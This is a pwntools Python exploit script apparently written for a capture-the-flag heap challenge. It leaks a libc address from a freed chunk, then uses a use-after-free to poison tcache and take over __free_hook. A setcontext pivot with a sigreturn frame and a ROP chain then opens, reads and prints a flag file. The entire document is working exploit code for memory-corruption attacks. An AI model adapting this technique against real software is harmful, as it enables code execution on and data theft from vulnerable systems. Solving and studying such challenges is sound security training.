from pwn import *

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context(arch=elf.arch, os=elf.os)
context.log_level = 'debug'
p = process([elf.path])


def add_chunk(index, size):
    p.sendafter(b"choice:", b"1")
    p.sendafter(b"index:", str(index).encode("ascii"))
    p.sendafter(b"size:", str(size).encode("ascii"))


def delete_chunk(index):
    p.sendafter(b"choice:", b"2")
    p.sendafter(b"index:", str(index).encode("ascii"))


def edit_chunk(index, content):
    p.sendafter(b"choice:", b"3")
    p.sendafter(b"index:", str(index).encode("ascii"))
    p.sendafter(b"length:", str(len(content)).encode("ascii"))
    p.sendafter(b"content:", content)


def show_chunk(index):
    p.sendafter(b"choice:", b"4")
    p.sendafter(b"index:", str(index).encode("ascii"))

# gdb.attach(p)
# pause()

# 泄露lib address
add_chunk(0, 0x500)
add_chunk(1, 0x500)
add_chunk(2, 0x10)

delete_chunk(0)
show_chunk(0)

tmp = p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")
# print("tmp", hex(u64(tmp)))
libc.address = u64(tmp) - 0x3afca0
print("libc.address", hex(libc.address))
buf_addr = libc.sym["__free_hook"] + 0x100

pop_rdi = 0x000000000002154d + libc.address
pop_rsi = 0x000000000002145c + libc.address
pop_rdx = 0x0000000000001b96 + libc.address

# 申请__free_hook
add_chunk(0, 0x400)
delete_chunk(0)
edit_chunk(0, p64(libc.sym["__free_hook"]))
add_chunk(0, 0x400)
add_chunk(0, 0x400)

payload = b""
payload += p64(libc.sym["setcontext"] + 53)
# rop start here
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(buf_addr)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(libc.sym["read"])
payload += p64(pop_rdi)
payload += p64(buf_addr)
payload += p64(libc.sym["puts"])
payload = payload.ljust(0x100, b"\x00")
payload += b"./flag\x00" # => buf_addr

edit_chunk(0, payload)

# open
frame = SigreturnFrame()
frame.rsp = libc.sym["__free_hook"] + 0x8
frame.rip = libc.sym["open"]
frame.rdi = buf_addr
frame.rsi = 0
frame.rbx = 0xdeadbeef
edit_chunk(1, bytes(frame))

# open ./flag , then -> rop
delete_chunk(1)

p.interactive()
